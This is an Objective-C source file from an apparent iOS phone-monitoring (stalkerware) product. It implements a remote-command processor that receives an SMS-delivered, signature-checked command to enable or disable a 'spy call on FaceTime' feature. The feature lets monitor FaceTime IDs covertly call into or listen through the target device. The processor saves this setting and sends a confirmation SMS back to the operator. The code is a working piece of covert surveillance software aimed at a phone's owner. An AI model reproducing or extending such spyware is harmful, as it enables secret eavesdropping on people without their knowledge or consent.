//
//  EnableSpycallOnFacetimeProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 7/10/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "EnableSpycallOnFacetimeProcessor.h"
#import "PrefMonitorFacetimeID.h"
#import "Preference.h"

@interface EnableSpycallOnFacetimeProcessor (PrivateAPI)
- (void) enableSpyCallOnFacetime;
- (BOOL) isValidFlag;
- (void) enableSpyCallOnFacetimeException;
- (void) sendReplySMS;
@end


@implementation EnableSpycallOnFacetimeProcessor


/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the EnableSpycallOnFacetimeProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (EnableSpycallOnFacetimeProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"EnableSpycallOnFacetimeProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the EnableSpycallOnFacetimeProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"EnableSpycallOnFacetimeProcessor--->doProcessingCommand");
	
	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
										 numberOfCompulsoryTag:3]) {
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"EnableSpycallOnFacetimeProcessor"
												  reason:@"Failed signature check"];
	}		
		
	if ([self isValidFlag])
		[self enableSpyCallOnFacetime];
	else
		[self enableSpyCallOnFacetimeException];				
}


/**
 - Method name: enableSpyCallOnFacetime
 - Purpose:This method is used to process enable Spy Call on Facetime
 - Argument list and description: No Argument
 - Return description: No Return type
 */

- (void) enableSpyCallOnFacetime {
	DLog (@"EnableSpycallOnFacetimeProcessor--->enableSpyCallOnFacetime");		
	NSUInteger flagValue								= [[[mRemoteCmdData mArguments] objectAtIndex:2] intValue];
	id <PreferenceManager> prefManager					= [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorFacetimeID *prefMonitorFacetimeID		= (PrefMonitorFacetimeID *)[prefManager preference:kFacetimeID];
	[prefMonitorFacetimeID setMEnableMonitorFacetimeID:flagValue];
	[prefManager savePreferenceAndNotifyChange:prefMonitorFacetimeID];
	[self sendReplySMS];	
}

/**
 - Method name: isValidFlag
 - Purpose:This method is used to validate the Arguments
 - Argument list and description: 
 - Return description:isValidArguments (BOOL)
 */

- (BOOL) isValidFlag {
	DLog (@"EnableSpycallOnFacetimeProcessor--->isValidFlag")
	BOOL isValid	= NO;
	NSArray *args	= [mRemoteCmdData mArguments];
	if ([args count] > 2)
		isValid		= [RemoteCmdProcessorUtils isZeroOrOneFlag:[args objectAtIndex:2]];	
	return isValid;
}

/**
 - Method name: enableSpyCallOnFacetimeException
 - Purpose:This method is invoked when enable Spycall on Facetime process is failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) enableSpyCallOnFacetimeException {
	DLog (@"EnableSpycallOnFacetimeProcessor--->enableSpyCallOnFacetimeException")
	FxException* exception = [FxException exceptionWithName:@"enableSpyCallOnFacetimeException" andReason:@"Enable Spycall on Facetime error"];	
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];		
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) sendReplySMS {
	
	DLog (@"EnableSpycallOnFacetimeProcessor--->sendReplySMS")
	NSString *messageFormat				= [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *enableSpyCallOnFacetimeMessage		= NSLocalizedString (@"kEnableSpycallOnFacetime", @"");
	
	if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue] == 1) 
		enableSpyCallOnFacetimeMessage			= [enableSpyCallOnFacetimeMessage stringByAppendingString:NSLocalizedString(@"kEnabled", @"")];
	else 
    	enableSpyCallOnFacetimeMessage			= [enableSpyCallOnFacetimeMessage stringByAppendingString:NSLocalizedString(@"kDisabled", @"")];
	
	enableSpyCallOnFacetimeMessage				= [messageFormat stringByAppendingString:enableSpyCallOnFacetimeMessage];
	
	//==========================================================================================================================
	// if monitors Array count ==0 then send sucess message with warning
	id <PreferenceManager> prefManager	= [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorFacetimeID *prefMonitorFacetimeID		= (PrefMonitorFacetimeID *)[prefManager preference:kFacetimeID];
	if (![[prefMonitorFacetimeID mMonitorFacetimeIDs] count]) {
		enableSpyCallOnFacetimeMessage = [NSString stringWithFormat:@"%@\n%@", enableSpyCallOnFacetimeMessage, NSLocalizedString(@"kEnableSpycallOnFacetimeSuccessWithWarning", @"")];
	}
	
	//===========================================================================================================================
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:enableSpyCallOnFacetimeMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:enableSpyCallOnFacetimeMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

- (void) dealloc {
	[super dealloc];
}


@end
